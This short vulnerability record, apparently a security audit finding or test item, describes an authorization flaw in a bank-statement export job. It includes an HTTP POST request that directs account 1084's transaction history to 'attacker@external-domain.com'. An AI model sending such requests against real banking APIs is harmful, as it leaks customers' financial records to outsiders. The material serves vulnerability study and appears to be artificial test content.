diagnosis: The asynchronous statement export job dispatches financial transaction histories directly to the email address provided at queuing time without verifying that the recipient email belongs to a currently authorized signatory of the bank account. If an employee was removed from an organization before the job runs, their personal email still receives the export.
exploit_request:
POST /api/banking/statements/export HTTP/1.1
Host: online.apexcreditunion.com
Authorization: Bearer 88|usertoken232323
Content-Type: application/json

{"account_id": 1084, "email": "attacker@external-domain.com"}
